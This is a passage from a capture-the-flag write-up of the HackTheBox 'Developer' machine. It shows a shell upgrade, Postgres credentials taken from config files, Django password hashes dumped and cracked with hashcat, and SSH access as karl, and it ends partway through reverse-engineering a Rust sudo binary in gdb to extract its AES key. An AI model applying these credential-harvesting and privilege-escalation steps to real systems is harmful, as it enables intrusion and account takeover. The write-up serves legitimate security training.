</span><span class="gp">www-data@developer:/var/sentry$</span><span class="w"> </span><span class="nb">id</span>
<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></code></pre></div></div>

<p>I’ll upgrade the shell with the standard trick:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@developer:/var/sentry$</span><span class="w"> </span>python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("bash")'</span>
<span class="go">python -c 'import pty;pty.spawn("bash")'
</span><span class="gp">www-data@developer:/var/sentry$</span><span class="w"> </span>^Z
<span class="go">[1]+  Stopped                 nc -lvnp 443
</span><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span> <span class="p">;</span> <span class="nb">fg</span>
<span class="go">            reset
reset: unknown terminal type unknown
Terminal type? screen
</span><span class="gp">www-data@developer:/var/sentry$</span><span class="w"> 
</span></code></pre></div></div>

<h2 id="shell-as-karl">Shell as karl</h2>

<h3 id="enumeration">Enumeration</h3>

<h4 id="homedirs">Homedirs</h4>

<p>There are two user home directories:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@developer:/home$</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">karl  mark
</span></code></pre></div></div>

<p>As www-data, I can’t access either:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@developer:/home$</span><span class="w"> </span><span class="nb">cd </span>karl/
<span class="go">bash: cd: karl/: Permission denied
</span><span class="gp">www-data@developer:/home$</span><span class="w"> </span><span class="nb">cd </span>mark/
<span class="go">bash: cd: mark/: Permission denied
</span></code></pre></div></div>

<h4 id="postgres">PostGres</h4>

<p>In <code class="language-plaintext highlighter-rouge">/var/www/developer_ctf/</code> is the Django project:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@developer:~/developer_ctf$</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">challenge_downloads  challenges  developer_ctf  developerenv  manage.py  profiles  static
</span></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">developer_ctf</code> holds the settings for the project. <code class="language-plaintext highlighter-rouge">profiles</code> and <code class="language-plaintext highlighter-rouge">challenges</code> are two custom apps. <code class="language-plaintext highlighter-rouge">challenge_downloads</code> and <code class="language-plaintext highlighter-rouge">static</code>  are static files, and <code class="language-plaintext highlighter-rouge">developerenv</code> is a virtual environment to make easier the integration with Apache / <code class="language-plaintext highlighter-rouge">mod_uwsgi</code>.</p>

<p>In <code class="language-plaintext highlighter-rouge">developer_ctf/settings.py</code>, there’s the DB config:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DATABASES</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">'default'</span><span class="p">:</span> <span class="p">{</span>       
        <span class="s">'ENGINE'</span><span class="p">:</span> <span class="s">'django.db.backends.postgresql'</span><span class="p">,</span>
        <span class="s">'NAME'</span><span class="p">:</span> <span class="s">'platform'</span><span class="p">,</span>
        <span class="s">'USER'</span><span class="p">:</span> <span class="s">'ctf_admin'</span><span class="p">,</span>
        <span class="s">'PASSWORD'</span><span class="p">:</span> <span class="s">'CTFOG2021'</span><span class="p">,</span>               
        <span class="s">'HOST'</span><span class="p">:</span> <span class="s">'localhost'</span><span class="p">,</span>
        <span class="s">'PORT'</span><span class="p">:</span> <span class="s">''</span><span class="p">,</span>
    <span class="p">}</span>                  
<span class="p">}</span>      
</code></pre></div></div>

<p>It’s a Postgres DB, and that’s everything needed to connect:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@developer:~/developer_ctf$</span><span class="w"> </span>psql postgresql://ctf_admin:CTFOG2021@localhost:5432/platform
<span class="go">psql (9.6.22)
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

</span><span class="gp">platform=&gt;</span><span class="w">
</span></code></pre></div></div>

<p>The instance has five databases:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">platform=&gt;</span><span class="w"> </span><span class="se">\l</span>ist
<span class="go">                                  List of databases
   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges
-----------+----------+----------+-------------+-------------+-----------------------
 platform  | postgres | UTF8     | en_GB.UTF-8 | en_GB.UTF-8 | 
 postgres  | postgres | UTF8     | en_GB.UTF-8 | en_GB.UTF-8 | 
 sentry    | postgres | UTF8     | en_GB.UTF-8 | en_GB.UTF-8 | 
 template0 | postgres | UTF8     | en_GB.UTF-8 | en_GB.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
 template1 | postgres | UTF8     | en_GB.UTF-8 | en_GB.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
(5 rows)
</span></code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">platform</code> DB has 21 tables:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">platform=&gt;</span><span class="w"> </span><span class="se">\d</span>t
<span class="go">                        List of relations
 Schema |                Name                | Type  |   Owner   
--------+------------------------------------+-------+-----------
 public | account_emailaddress               | table | ctf_admin
 public | account_emailconfirmation          | table | ctf_admin
 public | auth_group                         | table | ctf_admin
 public | auth_group_permissions             | table | ctf_admin
 public | auth_permission                    | table | ctf_admin
 public | auth_user                          | table | ctf_admin
 public | auth_user_groups                   | table | ctf_admin
 public | auth_user_user_permissions         | table | ctf_admin
 public | challenges_challenge               | table | ctf_admin
 public | challenges_challenge_solved        | table | ctf_admin
 public | django_admin_log                   | table | ctf_admin
 public | django_content_type                | table | ctf_admin
 public | django_migrations                  | table | ctf_admin
 public | django_session                     | table | ctf_admin
 public | django_site                        | table | ctf_admin
 public | profiles_profile                   | table | ctf_admin
 public | profiles_profile_solved_challenges | table | ctf_admin
 public | socialaccount_socialaccount        | table | ctf_admin
 public | socialaccount_socialapp            | table | ctf_admin
 public | socialaccount_socialapp_sites      | table | ctf_admin
 public | socialaccount_socialtoken          | table | ctf_admin
(21 rows)
</span></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">auth_user</code> is where Django stores the users:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">platform=&gt;</span><span class="w"> </span><span class="k">select </span><span class="nb">id</span>,username,password,is_superuser from auth_user<span class="p">;</span>
<span class="go"> id |   username   |                                         password                                         | is_superuser 
----+--------------+------------------------------------------------------------------------------------------+--------------
  6 | TheCyberGeek | pbkdf2_sha256$260000$vNMDolsiNtr0ZaLLprGPUC$yR80hZuHmIACTj1a5ZOvhL9+zeceotAlI9lVqRpQGfc= | f
  5 | clubby789    | pbkdf2_sha256$260000$FyKNWfAl4Z87o55I4bDST7$7PrVwU5N1687BSxClTP0tlnFg+9VmOR6lsXiJsSRBNE= | f
  2 | willwam845   | pbkdf2_sha256$260000$7Pu55SdoDNTu51RrtU5V8A$Fmn66ovbOqfNUKftQYrJcWmk7xzejU0g3F72jL+cdUg= | f
  3 | dmw0ng       | pbkdf2_sha256$260000$k0RbpkHl5CvArYIwsGxFUb$ixe4YKYn45Fm8aq56GEzF8TUi9lydD2WA2gRxXz/EMc= | f
  4 | jazzpizazz   | pbkdf2_sha256$260000$aFEnXsRKf4YRRUw1qnlJSN$4oL+FVJpqmi4sCt4U9ddPRE1srKZiP+HCXInnCuzdv0= | f
  7 | 0xdff        | pbkdf2_sha256$260000$jbMz3no7lHqvQSiF0O1xo3$pLDuNAcCGv4jky29NGfEfuDNRigk/H/GAt1jSfQsCxo= | f
  1 | admin        | pbkdf2_sha256$260000$H7w2AZzBGAHHHvSzgQZXHf$TWkQdxmDHXDxoWLSEQYjZQbMJJjMpzmEHBqWMNHr0xc= | t
(7 rows)
</span></code></pre></div></div>

<p>I didn’t find much else of interest in here.</p>

<p>The <code class="language-plaintext highlighter-rouge">sentry</code> DB has 60 tables:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sentry=&gt;</span><span class="w"> </span><span class="se">\d</span>t                                                                                             
<span class="go">WARNING: terminal is not fully functional                                                                
                      List of relations    
 Schema |               Name                | Type  | Owner  
--------+-----------------------------------+-------+--------
 public | auth_group                        | table | sentry
 public | auth_group_permissions            | table | sentry 
 public | auth_permission                   | table | sentry
 public | auth_user                         | table | sentry
 public | django_admin_log                  | table | sentry
 public | django_content_type               | table | sentry
 public | django_session                    | table | sentry
...[snip]...
 public | sentry_useroption                 | table | sentry
 public | sentry_userreport                 | table | sentry
 public | social_auth_association           | table | sentry
 public | social_auth_nonce                 | table | sentry
 public | social_auth_usersocialauth        | table | sentry
 public | south_migrationhistory            | table | sentry
(60 rows)
</span></code></pre></div></div>

<p>I tried to read the <code class="language-plaintext highlighter-rouge">auth_user</code> table, but this user doesn’t have permissions:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sentry=&gt;</span><span class="w"> </span><span class="k">select </span><span class="nb">id</span>,username,password,is_superuser from auth_user<span class="p">;</span>
<span class="go">ERROR:  permission denied for relation auth_user
</span></code></pre></div></div>

<p>Looking in <code class="language-plaintext highlighter-rouge">/etc</code>, there’s a config file for Sentry at <code class="language-plaintext highlighter-rouge">/etc/sentry/sentry.conf.py</code>, and it has connection information for a different user:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...[</span><span class="n">snip</span><span class="p">]...</span>
<span class="n">DATABASES</span> <span class="o">=</span> <span class="p">{</span>                                       
    <span class="s">'default'</span><span class="p">:</span> <span class="p">{</span>
        <span class="s">'ENGINE'</span><span class="p">:</span> <span class="s">'sentry.db.postgres'</span><span class="p">,</span>
        <span class="s">'NAME'</span><span class="p">:</span> <span class="s">'sentry'</span><span class="p">,</span>                           
        <span class="s">'USER'</span><span class="p">:</span> <span class="s">'sentry'</span><span class="p">,</span>
        <span class="s">'PASSWORD'</span><span class="p">:</span> <span class="s">'SentryPassword2021'</span><span class="p">,</span>
        <span class="s">'HOST'</span><span class="p">:</span> <span class="s">'localhost'</span><span class="p">,</span>
        <span class="s">'PORT'</span><span class="p">:</span> <span class="s">''</span><span class="p">,</span>
    <span class="p">}</span>     
<span class="p">}</span>
<span class="p">...[</span><span class="n">snip</span><span class="p">]...</span>
</code></pre></div></div>

<p>On connecting, judging by the prompt this user is elevated:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@developer:/etc/sentry$</span><span class="w"> </span>psql postgresql://sentry:SentryPassword2021@localhost:5432/sentry  
<span class="go">psql (9.6.22)
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

</span><span class="gp">sentry=#</span><span class="w">
</span></code></pre></div></div>

<p>There are two users:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sentry=#</span><span class="w"> </span><span class="k">select</span> <span class="n">id</span><span class="p">,</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="n">is_superuser</span> <span class="k">from</span> <span class="n">auth_user</span><span class="p">;</span>
<span class="go"> id |      username       |                                   password                                    | is_superuser 
----+---------------------+-------------------------------------------------------------------------------+--------------
  1 | karl@developer.htb  | pbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr+mgRb8ZL8othIs32aGmqahx1rGI= | t
  5 | jacob@developer.htb | pbkdf2_sha256$12000$MqrMlEjmKEQD$MeYgWqZffc6tBixWGwXX2NTf/0jIG42ofI+W3vcUKts= | t
(2 rows)
</span></code></pre></div></div>

<p>I already have the password for jacob, but karl is one of the users on the box!</p>

<h3 id="crack-hashes">Crack Hashes</h3>

<p>The hash for karl matches the format of <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">Hashcat mode</a> 10000, “Django (PBKDF2-SHA256)”. It cracks in about a minute giving a password of “insaneclownposse”:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>hashcat <span class="nt">-m</span> 10000 karl.hash /usr/share/wordlists/rockyou.txt 
<span class="go">...[snip]...
</span><span class="gp">pbkdf2_sha256$</span>12000<span class="nv">$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr</span>+mgRb8ZL8othIs32aGmqahx1rGI<span class="o">=</span>:insaneclownposse
</code></pre></div></div>

<h3 id="ssh">SSH</h3>

<p>That password actually works for karl over SSH:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>sshpass <span class="nt">-p</span> insaneclownposse ssh karl@10.10.11.103
<span class="go">...[snip]...
</span><span class="gp">karl@developer:~$</span><span class="w">
</span></code></pre></div></div>

<p>And I can get the user flag:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">karl@developer:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
<span class="go">700c0e85************************
</span></code></pre></div></div>

<h2 id="shell-as-root">Shell as root</h2>

<h3 id="enumeration-1">Enumeration</h3>

<p>karl can run a binary named <code class="language-plaintext highlighter-rouge">authenticator</code> as root with <code class="language-plaintext highlighter-rouge">sudo</code>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">karl@developer:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="go">[sudo] password for karl: 
Matching Defaults entries for karl on developer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karl may run the following commands on developer:
    (ALL : ALL) /root/.auth/authenticator
</span></code></pre></div></div>

<p>I can’t read in <code class="language-plaintext highlighter-rouge">/root</code>, but I can access that directory. That’s the only file in that directory:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">karl@developer:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /root/
<span class="go">ls: cannot open directory '/root/': Permission denied
</span><span class="gp">karl@developer:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /root/.auth
<span class="go">total 10408
-rwxr-xr-x 1 root root 10654632 May 26  2021 authenticator
</span><span class="gp">karl@developer:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-ld</span> /root/.auth
<span class="go">drwxr-xr-x 2 root karl 4096 May 26  2021 /root/.auth
</span></code></pre></div></div>

<p>I was thinking it might be something related to 2FA, but running shows it’s custom for Developer:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">karl@developer:~$</span><span class="w"> </span>/root/.auth/authenticator 
<span class="go">Welcome to TheCyberGeek's super secure login portal!
Enter your password to access the super user: 
0xdfpassword
You entered a wrong password!
</span></code></pre></div></div>

<h3 id="re">RE</h3>

<p>I’ll copy the binary to my VM with <code class="language-plaintext highlighter-rouge">scp</code>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>sshpass <span class="nt">-p</span> insaneclownposse scp karl@10.10.10.120:/root/.auth/authenticator <span class="nb">.</span>
</code></pre></div></div>

<p>Starting with <code class="language-plaintext highlighter-rouge">strings -n 10 authenticator</code> to get some clues about what’s going on. One that was particularly interesting:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invalid AES key size./root/.cargo/registry/src/github.com-1ecc6299db9ec823/rust-crypto-0.2.36/src/aessafe.rs/root/.cargo/registry/src/github.com-1ecc6299db9ec823/rust-crypto-0.2.36/src/buffer.rs
</code></pre></div></div>

<p>The binary is using AES crypto. It’s also clear it is written in Rust (from the <code class="language-plaintext highlighter-rouge">.rs</code> extension, as well as many other clues in <code class="language-plaintext highlighter-rouge">strings</code> output).</p>

<p><a href="https://www.rust-lang.org/">Rust</a> is very big on preventing the user from making exploitable errors, and thus the compiler adds in a ton of checks to catch and handle any overflows, which is nice for the developer, but a pain for someone reversing it. Neither free IDA nor Ghidra do very well with Rust, so I’ll use both to see what I can find.</p>

<p>Rust seems to use a stub <code class="language-plaintext highlighter-rouge">main</code> function to load the actual user created main. In Ghidra, the main function looks super simple. But clicking <code class="language-plaintext highlighter-rouge">lang_start_internal()</code> will take you into a library function, not the user created code. Rather, in the Listing window there’s an address labeled <code class="language-plaintext highlighter-rouge">authentication::main</code> (which doesn’t show up in the functions list, but in the namespaces functions, just like in the Authentication CTF challenge, see the <a href="https://www.youtube.com/watch?v=YrxFXvdtyDo?t=217">video</a> from the challenge above) that’s loaded into RAX and then put on the stack. That’s what I’m looking for:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210716064112741.webp">
    <img src="/img/image-20210716064112741.png" alt="image-20210716064112741" class="include_image ">
</picture>

<p>IDA is similar:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210716064213398.webp">
    <img src="/img/image-20210716064213398.png" alt="image-20210716064213398" class="include_image ">
</picture>

<p>It does show up in the function list:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210716064250143.webp">
    <img src="/img/image-20210716064250143.png" alt="image-20210716064250143" class="include_image ">
</picture>

<p>Because the Rust output is so confusing, I’ll do a lot of looking at something, getting it’s address, going to <code class="language-plaintext highlighter-rouge">gdb</code>, breaking there, and looking at the passed args. It’s useful to know the offset between the addresses Ghidra/IDA show and what’s in memory with <code class="language-plaintext highlighter-rouge">gdb</code> after PIE moves things around. So I’ll check the <code class="language-plaintext highlighter-rouge">main</code> stub.</p>

<p>Ghidra:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210716070441218.webp">
    <img src="/img/image-20210716070441218.png" alt="image-20210716070441218" class="include_image ">
</picture>

<p>IDA:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210716070513512.webp">
    <img src="/img/image-20210716070513512.png" alt="image-20210716070513512" class="include_image ">
</picture>

<p>In Ghidra it is at 0x107fd0, and IDA 0x7fd0. In <code class="language-plaintext highlighter-rouge">gdb</code> if I put a break at main, it seems to match:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">gdb-peda$</span><span class="w"> </span>b main
<span class="go">Breakpoint 1 at 0x7fd0
</span></code></pre></div></div>

<p>But on running the program, it PIE will change the all but the low three nibbles:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">gdb-peda$</span><span class="w"> </span>r
<span class="go">Starting program: /media/sf_CTFs/hackthebox/developer-10.10.10.120/authenticator 
...[snip]...
Breakpoint 1, 0x000055555555bfd0 in main ()
</span></code></pre></div></div>

<p>As long as I don’t exit <code class="language-plaintext highlighter-rouge">gdb</code>, the top will stay the same, and I can just update the low four nibbles (and for a small program, the forth on doesn’t change much).</p>

<p>At the top of the <code class="language-plaintext highlighter-rouge">authentication::main</code>, it is printing and then reading from STDIN into a buffer I’ve named <code class="language-plaintext highlighter-rouge">user_input</code>:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20220113172038839.webp">
    <img src="/img/image-20220113172038839.png" alt="image-20220113172038839" class="include_image ">
</picture>

<p>A bit later, there’s a bunch of constants saved into two variables I’ve named <code class="language-plaintext highlighter-rouge">key</code> and <code class="language-plaintext highlighter-rouge">iv</code>, before a call to <code class="language-plaintext highlighter-rouge">crypto::aes::ctr</code> with those blocks being passed in:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20220113172512783.webp">
    <img src="/img/image-20220113172512783.png" alt="image-20220113172512783" class="include_image ">
</picture>

<p>I think the decompile isn’t great here, as the returned object, <code class="language-plaintext highlighter-rouge">msg</code> is not used again. But later, I believe it is used to make this call:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20220113172653572.webp">
    <img src="/img/image-20220113172653572.png" alt="image-20220113172653572" class="include_image ">
</picture>

<p>The encrypted result will be saved into the variable I named <code class="language-plaintext highlighter-rouge">enc_user_input</code>, which is then compared against the <code class="language-plaintext highlighter-rouge">enc_pass_correct</code> bytes that were set on the stack just  before the crypto operations started.</p>

<picture>
    <source type="image/webp" srcset="/img/image-20220113172803944.webp">
    <img src="/img/image-20220113172803944.png" alt="image-20220113172803944" class="include_image ">
</picture>

<p>There’s a ton of stuff after the <code class="language-plaintext highlighter-rouge">||</code> in that if, but practically, it’s checking if the encrypted output is 0x20 = 32 bytes long, and if it matches the hardcoded bytes.</p>

<p>It looks like it’s taking my input, encrypting it with a static key and IV, and then comparing it to some bytes. That means that I can decrypt those bytes to see what the plaintext password should be. And with the key, IV, and encrypted bytes, I have all I need to do that.</p>

<p>I could also find the same bits of information looking in <code class="language-plaintext highlighter-rouge">gdb</code> as well. The first call to <code class="language-plaintext highlighter-rouge">crypto::aes::ctr</code> is at 0x107936 in Ghida:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210716092356180.webp">
    <img src="/img/image-20210716092356180.png" alt="image-20210716092356180" class="include_image ">
</picture>

<p>The other interesting one is at 0x1079a6:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210716092431989.webp">
    <img src="/img/image-20210716092431989.png" alt="image-20210716092431989" class="include_image ">
</picture>

<p>I’ll add those breaks in <code class="language-plaintext highlighter-rouge">gdb</code>, disable the break at main, and run. It reaches user input:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">gdb-peda$</span><span class="w"> </span>b <span class="k">*</span>0x000055555555b936
<span class="go">Breakpoint 2 at 0x55555555b936
</span><span class="gp">gdb-peda$</span><span class="w"> </span>b <span class="k">*</span>0x000055555555b9a6
<span class="go">Breakpoint 3 at 0x55555555b9a6
</span><span class="gp">gdb-peda$</span><span class="w"> </span>dis 1
<span class="gp">gdb-peda$</span><span class="w"> </span>r
<span class="go">Starting program: /media/sf_CTFs/hackthebox/developer-10.10.10.120/authenticator 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome to TheCyberGeek's super secure login portal!
Enter your password to access the super user: 
</span></code></pre></div></div>

<p>I’ll enter “0xdfpassword” and it runs to the first crypto breakpoint:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[----------------------------------registers-----------------------------------]
RAX: 0x5555555b7b70 --&gt; 0xca976a80f0251bfe 
RBX: 0x555555586fc0 (&lt;_ZN3std2io5stdio6_print17he89a42df6ab3cf66E&gt;:     push   r15)
RCX: 0x7fffffffdb20 --&gt; 0x9a95d2d9e3591f76 
RDX: 0x10 
RSI: 0x7fffffffdb10 --&gt; 0x6191795c3432e8a3 
RDI: 0x0 
RBP: 0x55555559d850 (&lt;__libc_csu_init&gt;: push   r15)
RSP: 0x7fffffffd9b0 --&gt; 0x0 
RIP: 0x55555555b936 (&lt;_ZN14authentication4main17h453271f02403abafE+406&gt;:        call   QWORD PTR [rip+0x580b4]        # 0x5555555b39f0)
R8 : 0x10 
R9 : 0x7ffff7f84be0 --&gt; 0x5555555b7b90 --&gt; 0x0 
R10: 0x8080808080808080 
R11: 0x30 ('0')
R12: 0x55555559e050 ("assertion failed: self.is_char_boundary(new_len)/usr/src/rustc-1.48.0/library/alloc/src/string.rsYou have successfully authenticated\nEnter your SSH public key in now:\nFailed to read input!src/main.rse"...)
R13: 0x0 
R14: 0x5555555b0920 --&gt; 0x55555555b220 (&lt;_ZN4core3ptr13drop_in_place17h63c710b71ecc8310E.llvm.10046553308101135558&gt;:    ret)
R15: 0x5555555b7b70 --&gt; 0xca976a80f0251bfe
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x55555555b926 &lt;_ZN14authentication4main17h453271f02403abafE+390&gt;:   mov    edx,0x10
   0x55555555b92b &lt;_ZN14authentication4main17h453271f02403abafE+395&gt;:   mov    r8d,0x10
   0x55555555b931 &lt;_ZN14authentication4main17h453271f02403abafE+401&gt;:   mov    edi,0x0
=&gt; 0x55555555b936 &lt;_ZN14authentication4main17h453271f02403abafE+406&gt;:   call   QWORD PTR [rip+0x580b4]        # 0x5555555b39f0
   0x55555555b93c &lt;_ZN14authentication4main17h453271f02403abafE+412&gt;:   mov    QWORD PTR [rsp],rax
   0x55555555b940 &lt;_ZN14authentication4main17h453271f02403abafE+416&gt;:   mov    QWORD PTR [rsp+0x8],rdx
   0x55555555b945 &lt;_ZN14authentication4main17h453271f02403abafE+421&gt;:   mov    r14,QWORD PTR [rsp+0x68]
   0x55555555b94a &lt;_ZN14authentication4main17h453271f02403abafE+426&gt;:   mov    QWORD PTR [rsp+0x40],0x1
Guessed arguments:
arg[0]: 0x0 
arg[1]: 0x7fffffffdb10 --&gt; 0x6191795c3432e8a3 
arg[2]: 0x10 
arg[3]: 0x7fffffffdb20 --&gt; 0x9a95d2d9e3591f76 
arg[4]: 0x10 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd9b0 --&gt; 0x0 
0008| 0x7fffffffd9b8 --&gt; 0x0 
0016| 0x7fffffffd9c0 --&gt; 0x5555555b4208 --&gt; 0x5555555b5a10 --&gt; 0x0 
0024| 0x7fffffffd9c8 --&gt; 0x0 
0032| 0x7fffffffd9d0 --&gt; 0x0 
0040| 0x7fffffffd9d8 --&gt; 0x0 
0048| 0x7fffffffd9e0 --&gt; 0x0 
0056| 0x7fffffffd9e8 --&gt; 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x000055555555b936 in authentication::main ()
</code></pre></div></div>

<p>When initializing a crypto object, typically it needs a key and an IV. <code class="language-plaintext highlighter-rouge">arg[1]</code> and <code class="language-plaintext highlighter-rouge">arg[3]</code> could be that, with <code class="language-plaintext highlighter-rouge">arg[2]</code> and <code class="language-plaintext highlighter-rouge">arg[4]</code> being the lengths of each.</p>

<p>I can grab them by printing 32-bytes (the iv immediately follows the key in memory):</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">gdb-peda$</span><span class="w"> </span>x/32xb 0x7fffffffdb10
<span class="go">0x7fffffffdb10: 0xa3    0xe8    0x32    0x34    0x5c    0x79    0x91    0x61
0x7fffffffdb18: 0x9e    0x20    0xd4    0x3d    0xbe    0xf4    0xf5    0xd5
0x7fffffffdb20: 0x76    0x1f    0x59    0xe3    0xd9    0xd2    0x95    0x9a
0x7fffffffdb28: 0xa7    0x98    0x55    0xdc    0x06    0x20    0x81    0x6a
</span></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">c</code> to continue to the next break, where it looked like it was using the crypto object to encrypt:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">gdb-peda$</span><span class="w"> </span>c
<span class="go">Continuing.
[----------------------------------registers-----------------------------------]
</span><span class="gp">RAX: 0x5555555b7d20 --&gt;</span><span class="w"> </span>0x0 
<span class="go">RBX: 0xc ('\x0c')
</span><span class="gp">RCX: 0x5555555b7d20 --&gt;</span><span class="w"> </span>0x0 
<span class="go">RDX: 0xc ('\x0c')
RSI: 0x5555555b7b50 ("0xdfpassword\n")
</span><span class="gp">RDI: 0x7fffffffd9b0 --&gt;</span><span class="w"> </span>0x5555555b7be0 <span class="nt">--</span><span class="o">&gt;</span> 0x5555555b7ba0 <span class="nt">--</span><span class="o">&gt;</span> 0x9a95d2d9e3591f76 
<span class="gp">RBP: 0x55555559d850 (&lt;__libc_csu_init&gt;</span>: push   r15<span class="o">)</span>
<span class="gp">RSP: 0x7fffffffd9b0 --&gt;</span><span class="w"> </span>0x5555555b7be0 <span class="nt">--</span><span class="o">&gt;</span> 0x5555555b7ba0 <span class="nt">--</span><span class="o">&gt;</span> 0x9a95d2d9e3591f76 
<span class="gp">RIP: 0x55555555b9a6 (&lt;_ZN14authentication4main17h453271f02403abafE+518&gt;</span>:        call   QWORD PTR <span class="o">[</span>rip+0x584d4]        <span class="c"># 0x5555555b3e80)</span>
<span class="go">R8 : 0xc ('\x0c')
</span><span class="gp">R9 : 0x7ffff7f84be0 --&gt;</span><span class="w"> </span>0x5555555b7d30 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
<span class="go">R10: 0x8080808080808080 
R11: 0x20 (' ')
R12: 0x55555559e050 ("assertion failed: self.is_char_boundary(new_len)/usr/src/rustc-1.48.0/library/alloc/src/string.rsYou have successfully authenticated\nEnter your SSH public key in now:\nFailed to read input!src/main.rse"...)
R13: 0x0 
R14: 0xc ('\x0c')
</span><span class="gp">R15: 0x5555555b7b70 --&gt;</span><span class="w"> </span>0xca976a80f0251bfe
<span class="go">EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
</span><span class="gp">   0x55555555b99b &lt;_ZN14authentication4main17h453271f02403abafE+507&gt;</span>:   mov    rcx,QWORD PTR <span class="o">[</span>rsp+0x40]
<span class="gp">   0x55555555b9a0 &lt;_ZN14authentication4main17h453271f02403abafE+512&gt;</span>:   mov    rdi,rsp
<span class="gp">   0x55555555b9a3 &lt;_ZN14authentication4main17h453271f02403abafE+515&gt;</span>:   mov    r8,rbx
<span class="gp">=&gt;</span><span class="w"> </span>0x55555555b9a6 &lt;_ZN14authentication4main17h453271f02403abafE+518&gt;:   call   QWORD PTR <span class="o">[</span>rip+0x584d4]        <span class="c"># 0x5555555b3e80</span>
<span class="gp">   0x55555555b9ac &lt;_ZN14authentication4main17h453271f02403abafE+524&gt;</span>:   cmp    QWORD PTR <span class="o">[</span>rsp+0x50],0x20
